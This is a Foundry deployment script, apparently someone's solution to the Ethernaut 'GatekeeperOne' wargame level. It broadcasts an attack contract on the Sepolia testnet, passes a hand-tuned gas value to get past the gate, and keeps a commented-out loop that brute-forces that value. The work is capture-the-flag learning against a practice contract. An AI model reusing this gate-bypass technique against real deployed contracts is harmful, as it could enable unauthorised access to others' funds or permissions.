// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked13_GatekeeperOne.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked13_GatekeeperOneScript --broadcast
contract Cracked13_GatekeeperOneScript is Script {
    address ethernaut_contracts;
    Cracked13_GatekeeperOne attack;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("GatekeeperOne_address"));
    }

    function run() public {
        vm.startBroadcast();
        attack = new Cracked13_GatekeeperOne(ethernaut_contracts);
        address player = vm.parseAddress(vm.envString("player"));
        bool res = attack.enter{gas: 1819100}(256);
        require(res, "attack fail");

        // //运行以下代码不广播找出gas
        // for (uint256 i = 0; i < 8191; i++) {
        //     bool res = attack.enter(i);
        //     if (res) {
        //         console.log("more gas is", i);
        //         return;
        //     }
        // }
        console.log("IGatekeeperOne(ethernaut_contracts).entrant() is", IGatekeeperOne(ethernaut_contracts).entrant());
        require(IGatekeeperOne(ethernaut_contracts).entrant() == player, "FAIL");
        vm.stopBroadcast();
    }
}
